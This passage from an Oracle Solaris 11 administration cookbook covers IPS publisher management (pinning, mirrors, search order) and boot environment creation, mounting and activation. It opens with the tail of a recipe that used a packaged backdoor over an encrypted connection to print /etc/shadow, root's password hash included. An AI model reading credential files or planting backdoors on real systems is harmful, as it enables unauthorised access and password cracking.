root:$5$xduDW1lC$I23.j8uPlFFYvxuH5Rc/JHEcAnZz5nK/h55zBKLyBwD:15984::::::3568
daemon:NP:6445::::::
bin:NP:6445::::::
sys:NP:6445::::::
adm:NP:6445::::::
lp:NP:6445::::::
uucp:NP:6445::::::
nuucp:NP:6445::::::
dladm:*LK*:::::::
netadm:*LK*:::::::
netcfg:*LK*:::::::
smmsp:NP:6445::::::
gdm:*LK*:::::::
zfssnap:NP:::::::
upnp:NP:::::::
xvm:*LK*:6445::::::
mysql:NP:::::::
openldap:*LK*:::::::
webservd:*LK*:::::::
postgres:NP:::::::
svctag:*LK*:6445::::::
unknown:*LK*:::::::
nobody:*LK*:6445::::::
noaccess:*LK*:6445::::::
nobody4:*LK*:6445::::::
aiuser:*LK*:15602::::::
pkg5srv:*LK*:15602::::::
ale:$5$58VTKuRg$CnJXk791Ni.ZGmtoHO3ueGVjiSWuXxxQXbut2X3Njy7:::::::</pre></div><p class="calibre7">The second step should be<a id="id148" class="calibre1"/> performed from another Oracle Solaris 11 machine (our client). However, for test purposes, I've used the same host.</p><div><div><div><div><h3 class="title2"><a id="ch01lvl3sec12" class="calibre1"/>An overview of the recipe</h3></div></div></div><p class="calibre7">There's no question that this recipe is <a id="id149" class="calibre1"/>very interesting and complex because we created a backdoor using an encrypted connection and used different programs to accomplish our tasks. Furthermore, we learned that the package has a manifest that describes the attributes and dependencies of the associated package. It wouldn't be an exaggeration to say that the manifest is the soul of the package.</p></div></div></div>

<div><div><div><div><div><h1 class="title" id="calibre_pb_0"><a id="ch01lvl1sec21" class="calibre1"/>Managing an IPS publisher on Solaris 11</h1></div></div></div><p class="calibre7">Maybe the administration of an IPS publisher doesn't seem so important compared to other activities, but it's a fundamental concept that can be used to explain other complex processes. It is surprising that these<a id="id150" class="calibre1"/> little details can help <a id="id151" class="calibre1"/>us with daily administration. So, as we've been using some repository commands since the beginning of the chapter, it's now time to learn more related commands.</p></div>

<div><div><div><div><div><h2 class="title1" id="calibre_pb_1"><a id="ch01lvl2sec28" class="calibre1"/>Getting ready</h2></div></div></div><p class="calibre7">To follow this recipe, it's necessary that we have a system (physical or virtual) running Oracle Solaris 11; we log in to the system as the root user and open a terminal.</p></div></div>

<div><div><div><div><div><h2 class="title1" id="calibre_pb_2"><a id="ch01lvl2sec29" class="calibre1"/>How to do it…</h2></div></div></div><p class="calibre7">To list existing publishers, we execute the following command:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">pkg publisher</strong>
PUBLISHER                   TYPE     STATUS P LOCATION
solaris                     origin   online F http://pkg.oracle.com/solaris/release/
solarisstudio               origin   online F https://pkg.oracle.com/solarisstudio/release/
training                    origin   online F http://localhost:8888/
Symantec     origin   online F file:///root/SFHA601/dvd2-sol_x64/sol11_x64/pkgs/VRTSpkgs.p5p/</pre></div><p class="calibre7">If we require more information about a specific publisher, we can gather it by executing the following command:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">pkg publisher training</strong>
            Publisher: training
                Alias: 
           Origin URI: http://localhost:8888/
              SSL Key: None
             SSL Cert: None
          Client UUID: 8d121db2-39c7-11e3-8ae9-8800275685b8
      Catalog Updated: October 27, 2013 01:05:46 AM 
              Enabled: Yes</pre></div><p class="calibre7">Among all these publishers, one<a id="id152" class="calibre1"/> is the preferential one. We<a id="id153" class="calibre1"/> display which one is preferential by running the following command:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">pkg publisher -P</strong>
PUBLISHER                   TYPE     STATUS P LOCATION
solaris                     origin   online F http://pkg.oracle.com/solaris/release/</pre></div><p class="calibre7">Needless to say, sometimes the administrator might have to change the preferred publisher; this task can be done by executing the following command:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">pkg publisher –P</strong>
PUBLISHER                   TYPE     STATUS P LOCATION
solaris                     origin   online F http://pkg.oracle.com/solaris/release/
root@solaris11:~# <strong class="calibre8">pkg set-publisher -P training</strong>
root@solaris11:~# <strong class="calibre8">pkg publisher</strong>
PUBLISHER                   TYPE     STATUS P LOCATION
training                    origin   online F http://localhost:8888/
solaris                     origin   online F http://pkg.oracle.com/solaris/release/
solarisstudio               origin   online F https://pkg.oracle.com/solarisstudio/release/
Symantec                    origin   online F file:///root/SFHA601/dvd2-sol_x64/sol11_x64/pkgs/VRTSpkgs.p5p/</pre></div><p class="calibre7">Returning to the old setting is straightforward. This is done using the following command:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">pkg set-publisher -P solaris</strong>
</pre></div><div><div><div><div><h3 class="title2"><a id="ch01lvl3sec13" class="calibre1"/>An overview of the recipe</h3></div></div></div><p class="calibre7">The main idea of this recipe was<a id="id154" class="calibre1"/> to change the primary<a id="id155" class="calibre1"/> publisher using the pkg <code class="email">set-publisher</code> command. Sometimes, it's an advisable procedure to enforce or valorize such a repository.</p></div></div></div>

<div><div><div><div><div><h1 class="title" id="calibre_pb_0"><a id="ch01lvl1sec22" class="calibre1"/>Pinning publishers</h1></div></div></div><p class="calibre7">It's not rare when the system has many configured publishers and it becomes necessary to ensure that a package that was installed from one publisher is not updated from another.</p><p class="calibre7">Personally, I've seen some<a id="id156" class="calibre1"/> situations where an installed package from a very reliable repository was corrupted by an update from another, not-so-reliable repository. That's funny. The same package exists, and it can be installed from two different repositories, but one of these repositories is less reliable, and eventually, it can offer a bad package. This is where pinning becomes useful. I guarantee that a package installed from a source (repository) will always be updated from the same repository. Let's learn how to do this.</p></div>

<div><div><div><div><div><h2 class="title1" id="calibre_pb_1"><a id="ch01lvl2sec30" class="calibre1"/>Getting ready</h2></div></div></div><p class="calibre7">To follow this recipe, it's necessary that we have a system (physical or virtual) running Oracle Solaris 11; we log in to the system as the root user and open a terminal. Access to the Internet is optional.</p></div></div>

<div><div><div><div><div><h2 class="title1" id="calibre_pb_2"><a id="ch01lvl2sec31" class="calibre1"/>How to do it…</h2></div></div></div><p class="calibre7">To pin a publisher, we type the following:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">pkg set-publisher --sticky solaris</strong>
</pre></div><p class="calibre7">Undoing the configuration is simple:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">pkg set-publisher --non-sticky solaris</strong>
</pre></div><div><h3 class="title2"><a id="note04" class="calibre1"/>Note</h3><p class="calibre7">Any new publisher will be pinned by default.</p></div><p class="calibre7">From now on, every package will always be updated from its original repository even if an update is available from another one.</p><div><div><div><div><h3 class="title2"><a id="ch01lvl3sec14" class="calibre1"/>An overview of the recipe</h3></div></div></div><p class="calibre7">This is an interesting situation. Usually, an administrator needs a package offered by two different publishers, each one with a<a id="id157" class="calibre1"/> determined level of reliability. In this case, we need to choose one of these and create a "sticky channel" to it.</p></div></div></div>

<div><div><div><div><div><h1 class="title" id="calibre_pb_0"><a id="ch01lvl1sec23" class="calibre1"/>Changing the URI and enabling and disabling a publisher</h1></div></div></div><p class="calibre7">Another requirement can be to <a id="id158" class="calibre1"/>change the URI of a publisher <a id="id159" class="calibre1"/>and point it to <a id="id160" class="calibre1"/>a new repository. For example, we copied all the Oracle Solaris 11 packages to the <code class="email">repo</code> directory under <code class="email">/repo_pool/repoimage/</code>.</p></div>

<div><div><div><div><div><h2 class="title1" id="calibre_pb_1"><a id="ch01lvl2sec32" class="calibre1"/>Getting ready</h2></div></div></div><p class="calibre7">To follow this recipe, it's necessary<a id="id161" class="calibre1"/> that we have a system (physical or virtual) running Oracle Solaris 11; we log in to the system as the root user and open a terminal. Access to the Internet is recommended.</p></div></div>

<div><div><div><div><div><h2 class="title1" id="calibre_pb_2"><a id="ch01lvl2sec33" class="calibre1"/>How to do it…</h2></div></div></div><p class="calibre7">We alter a publisher to point to a different URI by typing the following commands:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">pkg set-publisher -g http://localhost:9999 -G http://pkg.oracle.com/solaris/release/ solaris</strong>
root@solaris11:~# <strong class="calibre8">pkg publisher</strong>
PUBLISHER                   TYPE     STATUS P LOCATION
solaris                     origin   online F http://localhost:9999/
training                    origin   online F http://localhost:8888/
solarisstudio               origin   online F https://pkg.oracle.com/solarisstudio/release/
Symantec                    origin   online F file:///root/SFHA601/dvd2-sol_x64/sol11_x64/pkgs/VRTSpkgs.p5p/</pre></div><p class="calibre7">Remember that the URI, <code class="email">http://localhost:9999</code>, points to the repository, <code class="email">/repo_pool/repoimage/repo</code>. To revert it, we execute the following command:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">pkg set-publisher -g http://pkg.oracle.com/solaris/release/  -G http://localhost:9999 solaris</strong>
</pre></div><p class="calibre7">We list the publishers again by executing the following command:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">pkg publisher</strong>
PUBLISHER                   TYPE     STATUS P LOCATION
solaris                     origin   online F http://pkg.oracle.com/solaris/release/
training                    origin   online F http://localhost:8888/
solarisstudio               origin   online F https://pkg.oracle.com/solarisstudio/release/
Symantec                    origin   online F file:///root/SFHA601/dvd2-sol_x64/sol11_x64/pkgs/VRTSpkgs.p5p/</pre></div><p class="calibre7">Sometimes, we<a id="id162" class="calibre1"/> might be forced to<a id="id163" class="calibre1"/> disable a publisher; this task can be executed<a id="id164" class="calibre1"/> according to the following example:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">pkg set-publisher -d training</strong>
root@solaris11:~# <strong class="calibre8">pkg publisher</strong>
PUBLISHER                   TYPE     STATUS P LOCATION
solaris                     origin   online F http://pkg.oracle.com/solaris/release/
training       (disabled)   origin   online F http://localhost:8888/
solarisstudio               origin   online F https://pkg.oracle.com/solarisstudio/release/
Symantec                    origin   online F file:///root/SFHA601/dvd2-sol_x64/sol11_x64/pkgs/VRTSpkgs.p5p/</pre></div><p class="calibre7">To re-enable it, we run the<a id="id165" class="calibre1"/> following command:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">pkg set-publisher -e training</strong>
</pre></div><div><div><div><div><h3 class="title2"><a id="ch01lvl3sec15" class="calibre1"/>An overview of the recipe</h3></div></div></div><p class="calibre7">The handling of publishers is a very common task in Oracle Solaris 11, and we're probably going to be enabling and disabling publishers very often using the <code class="email">pkg set-publisher</code> command.</p></div></div></div>

<div><div><div><div><div><h1 class="title" id="calibre_pb_0"><a id="ch01lvl1sec24" class="calibre1"/>Creating a mirror repository</h1></div></div></div><p class="calibre7">If you remember, at the beginning of the chapter, we created a local repository with all the Oracle Solaris 11 packages<a id="id166" class="calibre1"/> and indexed this repository as being from the <code class="email">solaris</code> publisher. Thus, we have two repositories; the first one refers to the Oracle website using the URI, <a class="calibre1" href="http://pkg.oracle.com/solaris/release/">http://pkg.oracle.com/solaris/release/</a>, and the second one—which is referred by the URI, <code class="email">http//localhost:9999</code>—is stored on disk (<code class="email">/repo_pool/repoimage/repo</code>). Nonetheless, the publisher is the same: <code class="email">solaris</code>. So, as both have the same contents, one of them is a mirror of the other and can be configured with the steps discussed in the next sections.</p></div>

<div><div><div><div><div><h2 class="title1" id="calibre_pb_1"><a id="ch01lvl2sec34" class="calibre1"/>Getting ready</h2></div></div></div><p class="calibre7">To follow this recipe, it's necessary that we have a machine (physical or virtual) running Oracle Solaris 11; we log in to the system as the root user and open a terminal. Access to the Internet is necessary.</p></div></div>

<div><div><div><div><div><h2 class="title1" id="calibre_pb_2"><a id="ch01lvl2sec35" class="calibre1"/>How to do it…</h2></div></div></div><p class="calibre7">We need to <a id="id167" class="calibre1"/>set a mirror repository by executing the following commands:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">pkg set-publisher -m http://localhost:9999 solaris</strong>
root@solaris11:~# <strong class="calibre8">pkg publisher</strong>
PUBLISHER                   TYPE     STATUS P LOCATION
solaris                     origin   online F http://pkg.oracle.com/solaris/release/
solaris                     mirror   online F http://localhost:9999/
training                  origin   online F http://localhost:8888/
solarisstudio               origin   online F https://pkg.oracle.com/solarisstudio/release/
Symantec                    origin   online F file:///root/SFHA601/dvd2-sol_x64/sol11_x64/pkgs/VRTSpkgs.p5p/</pre></div><p class="calibre7">This output is very interesting because now there are two occurrences of the <code class="email">solaris</code> publisher; the first is the original (<code class="email">origin</code>), which contains the metadata and packages, and the second is the mirror, which contains only the contents of the packages. It is necessary to install a package because Oracle Solaris 11 prefers the mirror to retrieve the contents of the packages, but IPS also downloads the meta information (the publisher's catalog) from the original.</p><p class="calibre7">We can remove the URI that points to this mirror by executing the following command:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">pkg set-publisher -M http://localhost:9999 solaris</strong>
root@solaris11:~# <strong class="calibre8">pkg publisher</strong>
PUBLISHER                   TYPE     STATUS P LOCATION
solaris                     origin   online F http://pkg.oracle.com/solaris/release/
solarisstudio               origin   online F https://pkg.oracle.com/solarisstudio/release/
training                    origin   online F http://localhost:8888/</pre></div><div><div><div><div><h3 class="title2"><a id="ch01lvl3sec16" class="calibre1"/>An overview of the recipe</h3></div></div></div><p class="calibre7">Mirroring repositories is another way to say that if the primary repository is unavailable; there's a second place available to download the packages from. In other words, the same publisher offers its packages from two different locations. Additionally, mirrors offer an alternative to download <a id="id168" class="calibre1"/>the package contents without overloading the original repository.</p></div></div></div>

<div><div><div><div><div><h1 class="title" id="calibre_pb_0"><a id="ch01lvl1sec25" class="calibre1"/>Removing a repository and changing the search order</h1></div></div></div><p class="calibre7">There are some good<a id="id169" class="calibre1"/> administrative commands to maintain the consistency of the repository configuration. However, the publisher<a id="id170" class="calibre1"/> doesn't always maintain its importance and priorities, and this gives us the flexibility to invert the order of the search.</p></div>

<div><div><div><div><div><h2 class="title1" id="calibre_pb_1"><a id="ch01lvl2sec36" class="calibre1"/>Getting ready</h2></div></div></div><p class="calibre7">To follow this recipe, it's necessary that we have a machine (physical or virtual) running Oracle Solaris 11; we log in to the system as the root user and open a terminal. Access to the Internet is optional.</p></div></div>

<div><div><div><div><div><h2 class="title1" id="calibre_pb_2"><a id="ch01lvl2sec37" class="calibre1"/>How to do it…</h2></div></div></div><p class="calibre7">We remove<a id="id171" class="calibre1"/> a publisher using the following commands:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">pkg unset-publisher Symantec</strong>
root@solaris11:~# <strong class="calibre8">pkg publisher</strong>
PUBLISHER                   TYPE     STATUS P LOCATION
solaris                     origin   online F http://pkg.oracle.com/solaris/release/
solaris                     mirror   online F http://localhost:9999/
training                    origin   online F http://localhost:8888/
solarisstudio               origin   online F https://pkg.oracle.com/solarisstudio/release/</pre></div><p class="calibre7">We might still prefer that the search action look for a specific publisher before another one. This task can be executed using the following commands:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">pkg set-publisher --search-before training solarisstudio</strong>
root@solaris11:~# <strong class="calibre8">pkg publisher</strong>
PUBLISHER                   TYPE     STATUS P LOCATION
solaris                     origin   online F http://pkg.oracle.com/solaris/release/
solaris                     mirror   online F http://localhost:9999/
solarisstudio               origin   online F https://pkg.oracle.com/solarisstudio/release/
training                    origin   online F http://localhost:8888/</pre></div><div><div><div><div><h3 class="title2"><a id="ch01lvl3sec17" class="calibre1"/>An overview of the recipe</h3></div></div></div><p class="calibre7">This short<a id="id172" class="calibre1"/> recipe teaches us how we can change the search order of repositories according to our best interests.</p></div></div></div>

<div><div><div><div><div><h1 class="title" id="calibre_pb_0"><a id="ch01lvl1sec26" class="calibre1"/>Listing and creating a boot environment</h1></div></div></div><p class="calibre7">We've learned that boot environments have a wide spectrum of application on Oracle Solaris 11, like patching a system, for example. This section lets us analyze the administration and<a id="id173" class="calibre1"/> management of a BE a bit more.</p><p class="calibre7">Without any question, listing<a id="id174" class="calibre1"/> and creating BEs is one of the more basic tasks when administering a boot environment. However, every BE administration starts from this point.</p></div>

<div><div><div><div><div><h2 class="title1" id="calibre_pb_1"><a id="ch01lvl2sec38" class="calibre1"/>Getting ready</h2></div></div></div><p class="calibre7">To follow this recipe, it's necessary that we have a machine (physical or virtual) running Oracle Solaris 11; we log in to the system as the root user and open a terminal. Access to the Internet is optional. Some extra space on the disk is important.</p></div></div>

<div><div><div><div><div><h2 class="title1" id="calibre_pb_2"><a id="ch01lvl2sec39" class="calibre1"/>How to do it…</h2></div></div></div><p class="calibre7">The most basic command when administering a BE is to list the existing boot environments:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">beadm list</strong>
BE               Active Mountpoint Space  Policy Created          
--               ------ ---------- -----  ------ -------          
solaris          NR     /          25.86G static 2013-10-05 20:44 
solaris-backup-1 -      -          303.0K static 2013-10-26 22:49 
solaris-backup-a -      -          7.26G  static 2013-10-10 19:57 </pre></div><p class="calibre7">The next natural step is to create a new boot environment:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">beadm create solaris_test_1</strong>
root@solaris11:~# <strong class="calibre8">beadm list</strong>
BE               Active Mountpoint Space  Policy Created          
--               ------ ---------- -----  ------ -------          
solaris          NR     /          25.88G static 2013-10-05 20:44 
solaris-backup-1 -      -          303.0K static 2013-10-26 22:49 
solaris-backup-a -      -          7.26G  static 2013-10-10 19:57 
solaris_test_1   -      -          204.0K static 2013-11-05 22:38 </pre></div><div><div><div><div><h3 class="title2"><a id="ch01lvl3sec18" class="calibre1"/>An overview of the recipe</h3></div></div></div><p class="calibre7">In this recipe, we had a quick review of how to create boot environments. This recipe will be used a number<a id="id175" class="calibre1"/> of times in future procedures.</p></div></div></div>

<div><div><div><div><div><h1 class="title" id="calibre_pb_0"><a id="ch01lvl1sec27" class="calibre1"/>Mounting, unmounting, installing, and uninstalling a package in an inactive boot environment</h1></div></div></div><p class="calibre7">Many times, we want to install a package in an inactive BE and later (maybe at night), boot this BE and test <a id="id176" class="calibre1"/>whether the programs are working. Furthermore, we can<a id="id177" class="calibre1"/> keep all BEs consistent with<a id="id178" class="calibre1"/> each other and<a id="id179" class="calibre1"/> have them contain the same packages without booting each one to install a new package.</p></div>

<div><div><div><div><div><h2 class="title1" id="calibre_pb_1"><a id="ch01lvl2sec40" class="calibre1"/>Getting ready</h2></div></div></div><p class="calibre7">To follow this recipe, it's necessary<a id="id180" class="calibre1"/> that we have a<a id="id181" class="calibre1"/> machine (physical or virtual) running Oracle Solaris 11; we log in to the system as the root <a id="id182" class="calibre1"/>user and <a id="id183" class="calibre1"/>open a terminal.</p></div></div>

<div><div><div><div><div><h2 class="title1" id="calibre_pb_2"><a id="ch01lvl2sec41" class="calibre1"/>How to do it…</h2></div></div></div><p class="calibre7">We use the following commands to install a new package into a new BE (<code class="email">solaris_test_1</code>):</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">mkdir /solaris_test_1</strong>
root@solaris11:~# <strong class="calibre8">beadm mount solaris_test_1 /solaris_test_1</strong>
root@solaris11:~# <strong class="calibre8">beadm list</strong>
BE               Active Mountpoint      Space  Policy Created          
--               ------ ----------      -----  ------ -------          
solaris          NR     /               25.94G static 2013-10-05 20:44 
solaris-backup-1 -      -               303.0K static 2013-10-26 22:49 
solaris-backup-a -      -               7.26G  static 2013-10-10 19:57 
solaris_test_1   -      /solaris_test_1 27.37M static 2013-11-05 22:38 </pre></div><p class="calibre7">We install the package in this mounted boot environment by running the following command:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">pkg -R /solaris_test_1 install unrar</strong>
Packages to install: 1
DOWNLOAD                                PKGS         FILES    XFER (MB)   SPEED
Completed                                1/1           6/6      0.1/0.1  656k/s
PHASE                                          ITEMS
Installing new actions                         19/19
Updating package state database                 Done 
Updating image state                            Done 
Creating fast lookup database                   Done</pre></div><p class="calibre7">The <code class="email">unrar</code> package <a id="id184" class="calibre1"/>was installed <a id="id185" class="calibre1"/>into the new BE (<code class="email">solaris_test_1</code>) and not<a id="id186" class="calibre1"/> into the current one (<code class="email">solaris</code>). Proving this fact is easy:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">unrar</strong>
bash: unrar: command not found
root@solaris11:~#</pre></div><div><h3 class="title2"><a id="note05" class="calibre1"/>Note</h3><p class="calibre7">The same package can be removed using the following command:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">pkg -R /solaris_test_1 uninstall unrar</strong>
</pre></div></div><p class="calibre7">Once the <code class="email">unrar</code> <a id="id187" class="calibre1"/>package has<a id="id188" class="calibre1"/> been installed, we can<a id="id189" class="calibre1"/> unmount the BE by running the following commands:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">beadm umount solaris_test_1</strong>
root@solaris11:~# <strong class="calibre8">beadm list</strong>
BE               Active Mountpoint Space   Policy Created          
--               ------ ---------- -----   ------ -------          
solaris          NR     /          25.94G  static 2013-10-05 20:44 
solaris-backup-1 -      -          303.0K  static 2013-10-26 22:49 
solaris-backup-a -      -          7.26G   static 2013-10-10 19:57 
solaris_test_1   -      -          122.88M static 2013-11-05 22:38 </pre></div><div><div><div><div><h3 class="title2"><a id="ch01lvl3sec19" class="calibre1"/>An overview of the recipe</h3></div></div></div><p class="calibre7">This neat recipe taught us how to <a id="id190" class="calibre1"/>mount an inactive boot environment and install a package into this inactive BE by using the <code class="email">-R</code> option to specify the mount point.</p></div></div></div>

<div><div><div><div><div><h1 class="title" id="calibre_pb_0"><a id="ch01lvl1sec28" class="calibre1"/>Activating a boot environment</h1></div></div></div><p class="calibre7">In a system with multiple BEs, situations might arise when it becomes necessary to activate a BE to test a<a id="id191" class="calibre1"/> patch or a new package without running the risk of losing the production environment. Therefore, a new BE will have to be created, changed, and finally, tested. However, it will have to be activated first. So, in all cases, the following recipes will be suitable.</p></div>

<div><div><div><div><div><h2 class="title1" id="calibre_pb_1"><a id="ch01lvl2sec42" class="calibre1"/>Getting ready</h2></div></div></div><p class="calibre7">To follow this recipe, it's necessary that we have a machine (physical or virtual) running Oracle Solaris 11; we log in to the system as the root user and open a terminal. Some extra disk space might be necessary.</p></div></div>

<div><div><div><div><div><h2 class="title1" id="calibre_pb_2"><a id="ch01lvl2sec43" class="calibre1"/>How to do it…</h2></div></div></div><p class="calibre7">First, let's activate the recently created BE:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">beadm activate solaris_test_1</strong>
root@solaris11:~# <strong class="calibre8">beadm list</strong>
BE               Active Mountpoint Space  Policy Created          
--               ------ ---------- -----  ------ -------          
solaris          N      /          37.96M static 2013-10-05 20:44 
solaris-backup-1 -      -          303.0K static 2013-10-26 22:49 
solaris-backup-a -      -          7.26G  static 2013-10-10 19:57 
solaris_test_1   R      -          26.06G static 2013-11-05 22:38 </pre></div><p class="calibre7">Now, let's reboot it:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">init 6</strong>
</pre></div><p class="calibre7">After rebooting, let's test the existing <code class="email">unrar</code> package and command:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">beadm list</strong>
BE             Active Mountpoint Space  Policy Created          
--             ------ ---------- -----  ------ -------          
solaris        -      -          8.57M  static 2013-10-05 20:44 
solaris-backup-1 -      -          303.0K static 2013-10-26 22:49 
solaris-backup-a -      -          7.26G  static 2013-10-10 19:57 
solaris_test_1   NR      -          26.06G static 2013-11-05 22:38 

root@solaris11:~# <strong class="calibre8">pkg info unrar</strong>
          Name: archiver/unrar
       Summary: Rar archives extractor utility
      Category: Applications/System Utilities
         State: Installed
     Publisher: solaris
       Version: 4.1.4
 Build Release: 5.11
        Branch: 0.175.1.0.0.24.0
Packaging Date: September  4, 2012 05:05:49 PM 
          Size: 391.47 kB
          FMRI: pkg://solaris/archiver/unrar@4.1.4,5.11-0.175.1.0.0.24.0:20120904T170549Z</pre></div><p class="calibre7">Now, let's test our <a id="id192" class="calibre1"/>procedure by executing the following command:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">unrar</strong>
UNRAR 4.10 freeware      Copyright (c) 1993-2012 Alexander Roshal

Usage:     unrar &lt;command&gt; -&lt;switch 1&gt; -&lt;switch N&gt; &lt;archive&gt; &lt;files...&gt;
               &lt;@listfiles...&gt; &lt;path_to_extract\&gt;

&lt;Commands&gt;
  e             Extract files to current directory
  l[t,b]        List archive [technical, bare]
  p             Print file to stdout
  t             Test archive files
  v[t,b]        Verbosely list archive [technical,bare]
  x             Extract files with full path

&lt;Switches&gt;
  -             Stop switches scanning
  @[+]          Disable [enable] file lists</pre></div><p class="calibre7">Wonderful! The <code class="email">unrar</code> package has appeared on the system in the way that we planned.</p><div><div><div><div><h3 class="title2"><a id="ch01lvl3sec20" class="calibre1"/>An overview of the recipe</h3></div></div></div><p class="calibre7">The act of activating and rebooting a BE are the final steps to be completed before we start using the BE. Likely, it's during this stage that we can test an installation package, an installation patch, or even an Oracle Solaris 11 upgrade without worrying about losing the whole system.</p></div></div></div>

<div><div><div><div><div><h1 class="title" id="calibre_pb_0"><a id="ch01lvl1sec29" class="calibre1"/>Creating a boot environment from an existing one</h1></div></div></div><p class="calibre7">Now, it's an<a id="id193" class="calibre1"/> appropriate time to talk about the possibility of creating a new environment from an existing one.</p></div>

<div><div><div><div><div><h2 class="title1" id="calibre_pb_1"><a id="ch01lvl2sec44" class="calibre1"/>Getting ready</h2></div></div></div><p class="calibre7">To follow this recipe, it's necessary that we have a machine (physical or virtual) running Oracle Solaris 11; we log in to the system as the root user and open a terminal. Some extra disk space might be necessary.</p></div></div>

<div><div><div><div><div><h2 class="title1" id="calibre_pb_2"><a id="ch01lvl2sec45" class="calibre1"/>How to do it…</h2></div></div></div><p class="calibre7">To perform this recipe, we're obliged to create a backup from the current BE (<code class="email">solaris_test_1</code>), after which we should be successful in creating a new BE from this backup. The whole process uses <a id="id194" class="calibre1"/>snapshots. (In this case, we are using a logical snapshot, which uses pointers to leave the original image untouched.) Let's create a snapshot by running the following command:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">beadm create solaris_test_1@backup</strong>
root@solaris11:~# <strong class="calibre8">beadm list -a solaris_test_1</strong>
BE/Dataset/Snapshot                               Active Mountpoint Space   Policy Created          
-------------------                               ------ ---------- -----   ------ -------          
solaris_test_1
rpool/ROOT/solaris_test_1                         NR     /          26.06G static 2013-11-05 22:38 
rpool/ROOT/solaris_test_1/var                     -      /var       421.96M static 2013-11-08 04:06 
rpool/ROOT/solaris_test_1/var@2013-10-10-22:27:20 -      -          66.49M  static 2013-10-10 19:27 
rpool/ROOT/solaris_test_1/var@2013-11-08-06:06:01 -      -          62.48M  static 2013-11-08 04:06 
rpool/ROOT/solaris_test_1/var@backup              -      -          73.0K   static 2013-11-08 04:23 
rpool/ROOT/solaris_test_1/var@install             -      -          63.03M  static 2013-10-05 21:01 
rpool/ROOT/solaris_test_1@2013-10-10-22:27:20     -      -          132.81M static 2013-10-10 19:27 
rpool/ROOT/solaris_test_1@2013-11-08-06:06:01     -      -          65.78M  static 2013-11-08 04:06 
rpool/ROOT/solaris_test_1@backup                  -      -          0       static 2013-11-08 04:23 
rpool/ROOT/solaris_test_1@install                 -      -          105.95M static 2013-10-05 21:01 </pre></div><p class="calibre7">We are now ready to create a new BE from another one:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">beadm create -e solaris_test_1@backup solaris_test_2</strong>
root@solaris11:~# <strong class="calibre8">beadm list</strong>
BE                 Active Mountpoint Space   Policy  Created        
--                 ------ ---------- -----   ------  -------          
solaris            -      -          8.57M   static  2013-10-05 20:44 
solaris-backup-1   -      -          303.0K  static  2013-10-26 22:49 
solaris-backup-a   -      -          7.26G   static  2013-10-10 19:57 
solaris_test_1     NR     -          26.06G  static  2013-11-05 22:38 
solaris_test_2     -      -          209.0K  static  2013-11-08 04:23 </pre></div><p class="calibre7">At this point, it might be logical to activate this environment (<code class="email">beadm activate solaris_test_2</code>) and boot it.</p><p class="calibre7">Finally, before finishing<a id="id195" class="calibre1"/> the chapter, we need to reactivate the original <code class="email">solaris</code> boot environment, reboot the system, and remove all the remaining BEs:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">beadm activate solaris</strong>
root@solaris11:~# <strong class="calibre8">init 6</strong>
root@solaris11:~# <strong class="calibre8">beadm destroy solaris_test_2</strong>
Are you sure you want to destroy solaris_test_2?  This action cannot be undone(y/[n]): <strong class="calibre8">y</strong>

root@solaris11:~# <strong class="calibre8">beadm destroy solaris_test_1</strong>
Are you sure you want to destroy solaris_test_1?  This action cannot be undone(y/[n]): <strong class="calibre8">y</strong>

root@solaris11:~# <strong class="calibre8">beadm destroy solaris-backup-a</strong>
Are you sure you want to destroy solaris-backup-a?  This action cannot be undone(y/[n]): <strong class="calibre8">y</strong>

root@solaris11:~# <strong class="calibre8">beadm destroy solaris-backup-1</strong>
Are you sure you want to destroy solaris-backup-1?  This action cannot be undone(y/[n]): <strong class="calibre8">y</strong>

root@solaris11:~# <strong class="calibre8">beadm list</strong>
BE       Active  Mountpoint  Space   Policy  Created          
--       ------  ----------  -----   ------  -------          
solaris  NR      /           25.46G  static  2013-10-05 20:44</pre></div><div><div><div><div><h3 class="title2"><a id="ch01lvl3sec21" class="calibre1"/>An overview of the recipe</h3></div></div></div><p class="calibre7">This final recipe from the chapter has shown us a quick way to create a new BE based on an old one. To do this, we needed to take a backup first. Finally, we destroyed the existing BEs to clean up our system. Obviously, it's not appropriate to destroy the booted BE.</p></div></div></div>
